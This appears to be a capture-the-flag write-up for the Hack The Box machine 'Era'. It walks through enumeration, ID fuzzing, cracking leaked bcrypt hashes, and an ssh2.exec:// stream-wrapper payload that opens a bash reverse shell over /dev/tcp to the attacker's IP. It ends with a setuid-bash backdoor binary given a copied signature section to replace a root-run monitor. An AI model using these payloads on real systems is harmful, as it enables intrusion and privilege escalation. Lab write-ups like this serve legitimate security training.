---
layout: post
title: "[HTB] Era"
description: "[Machine] - Medium difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Medium
---

![Era](/img/htb_img/Era_img/Era.png)

<br>

# Enumeration
## Nmap recon

```bash
‚ùØ sudo nmap -p- --open --min-rate 1500 -T4 -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 18:26 CEST
Initiating SYN Stealth Scan at 18:26
Scanning 10.129.xx.xx [65535 ports]
Discovered open port 21/tcp on 10.129.xx.xx
Discovered open port 80/tcp on 10.129.xx.xx
Completed SYN Stealth Scan at 18:26, 12.77s elapsed (65535 total ports)
Nmap scan report for 10.129.xx.xx
Host is up, received user-set (0.049s latency).
Scanned at 2025-07-28 18:26:39 CEST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.89 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
```

Scripts and versions.

```bash
‚ùØ nmap -p21,80 -sCV -Pn -oN targeted $target                                                                                                                                                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 18:27 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds
```

`era.htb` domain.

```bash
‚ùØ echo "$target era.htb" | sudo tee -a /etc/hosts
10.129.xx.xx era.htb
```

<aside>
üí•

Ports:

- 21: FTP ‚Üí VSFTPD 3.0.5
- 80: HTTP ‚Üí NGINX 1.18.0 (Ubuntu)
</aside>

---

## TCP 21: FTP

Tried logging in as anonymous but if nmap doesn‚Äôt show this part it‚Äôs unlikely it‚Äôs gonna work.

---

## TCP 80: HTTP nginx

![Web page](/img/htb_img/Era_img/image.png)

Web page

### Basic directory fuzzing

```bash
‚ùØ gobuster -q dir -u http://era.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]
/css                  (Status: 301) [Size: 178] [--> http://era.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://era.htb/js/]
/fonts                (Status: 301) [Size: 178] [--> http://era.htb/fonts/]
```

Nothing interesting on the directories.

---

### Subdomain fuzzing

```bash
‚ùØ domain=era.htb; wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://$domain -H "Host: FUZZ.$domain" --hh=154
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://era.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
=====================================================================

000000687:   200        233 L    559 W      6765 Ch     "file"
```

We found the `file` subdomain. So we add it to our hosts file.

---

![file.era.htb](/img/htb_img/Era_img/image%201.png)

file.era.htb

[](http://file.era.htb/register.php)

We can register a new user at the /register.php endpoint.

If we navigate to the upload files part, we can upload something and it gives us an endpoint to download it.

![Upload endpoint](/img/htb_img/Era_img/image%202.png)

Upload endpoint

The endpoints for download are simple with an numerical id, so we can create a sequence and fuzz with that again.

```bash
seq 0 500 > id.txt
```

```bash
‚ùØ ffuf -u http://file.era.htb/download.php\?id\=FUZZ -w id.txt -H "Cookie: PHPSESSID=frng9vk6rfmbi0t509mplee65k" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /home/kali/HTB/Machines/Era/scripts/id.txt
 :: Header           : Cookie: PHPSESSID=frng9vk6rfmbi0t509mplee65k
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 45ms]
```

![id 54 download](/img/htb_img/Era_img/image%203.png)

id 54 download

So, we have a backup to download at id 54.

![SQLite backup](/img/htb_img/Era_img/image%204.png)

SQLite backup

Data backup for sqlite3

---

### Password cracking

```bash
‚ùØ sudo john -w=/usr/share/wordlists/rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
america          (?)     
mustang          (?)     
2g 0:00:01:02 0.02% (ETA: 2025-08-01 08:51) 0.03206g/s 56.26p/s 235.4c/s 235.4C/s kingston..25252525
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

So we got the following:

<aside>
üí•

yuri:mustang

eric:america

</aside>

---

<br>

# Foothold

## FTP - Yuri

```bash
‚ùØ ftp $target
Connected to 10.129.xx.xx.
220 (vsFTPd 3.0.5)
Name (10.129.xx.xx:kali): yuri
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||31885|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
```

Two directories, apache and php8.1.Not much interesting and we have no rights to upload or modify things here. We can use this credentials to log via web.

We have the possibility of updating security questions to other users, we try to do that against the admin that we got on the DB backup.

![Security questions admin](/img/htb_img/Era_img/image%205.png)

Security questions admin

And we try logging in.

---

## Admin in webpage

![Admin in webpage](/img/htb_img/Era_img/image%206.png)

Admin in webpage

Here we can see that we have other file, `signing.zip` . We can download it.

```bash
‚ùØ unzip signing.zip             
Archive:  signing.zip
  inflating: key.pem                 
  inflating: x509.genkey
```

---

## Shell as Eric and user.txt

The application running `file.era.htb` has an **IDOR** at the download.php endpoint. It has a stream wrapper at the format parameter. This can be potentially exploited with the ssh2.exec:// wrapper to host an SSH server running locally if it exists.

I uploaded a file and accessed it with the following payload:

```bash
http://file.era.htb/download.php?id=271&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.X.X%2F9001%200%3E%261;true%27
```

```bash
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.X.X] from (UNKNOWN) [10.129.xx.xx] 43920
bash: cannot set terminal process group (39706): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
bash-5.1$ cat user.txt
<REDACTED>
bash-5.1$ 
```

---

<br>

# Lateral Movement

We can change to the Yuri username if we need it with su, the password is the same as in the web.

<br>

# Privilege Escalation

The user ERIC is part of the group `devs`, so if something is owned by this group we can access it.

```bash
bash-5.1$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
bash-5.1$ find / -group devs 2>/dev/null
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

We got some hits at the `/opt/AV` location.

---

## Backdoor creation

I created a shell.c program so we can add it to the execution of the monitor binary.

```bash
bash-5.1$ printf '#include <stdlib.h>\n\nint main() {\n    system("chmod u+s /bin/bash");\n    return 0;\n}\n' > shell.c
bash-5.1$ cat shell.c
#include <stdlib.h>

int main() {
    system("chmod u+s /bin/bash");
    return 0;
}
bash-5.1$ 
```

Compile it statically so it is standalone.

```bash
bash-5.1$ gcc -static -o shell shell.c 
bash-5.1$
```

## Attack chain

### üß± 1.

```bash
objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
```

**What it does:**

> Extracts the .text_sig section from the binary /opt/AV/periodic-checks/monitor and saves it into a file called sig.
> 
- `-dump-section .text_sig=sig`: tells `objcopy` to pull out the named section `.text_sig` and save it to a file named `sig`.
- This might be a **signature section** used by an antivirus or integrity checker.

üß† *Goal:* Save the original signature before modifying the binary.

---

### üß™ 2.

```bash
objcopy --add-section .text_sig=sig shell
```

**What it does:**

> Inserts the previously saved .text_sig section (sig) into a new binary named shell.
> 
- You're essentially **reinjecting the original signature** into a new or modified binary (`shell`).
- This is commonly done to try to **bypass integrity checks** or make the altered binary **appear "authentic"**.

---

### üß® 3.

```bash
cp shell /opt/AV/periodic-checks/monitor
```

**What it does:**

> Replaces the original binary with your modified one.
> 
- `shell` is your modified version ‚Äî possibly with injected code, a payload, etc.
- You're copying it over the original monitored binary, hoping the **signature section fools the AV or monitoring system**.

---

With this attack chain, we then look at the /bin/bash binary to see if it has been modified and we can execute it as root.

```bash
bash-5.1$ ls -lah /bin/bash
-rwsr-xr-x 1 root root 1.4M Mar 14  2024 /bin/bash
bash-5.1$ bash -p
bash-5.1# id
uid=1000(eric) gid=1000(eric) euid=0(root) groups=1000(eric),1001(devs)
bash-5.1#
```

### Root flag

```bash
bash-5.1# cd /root
bash-5.1# cat root.txt
<REDACTED>
bash-5.1#
```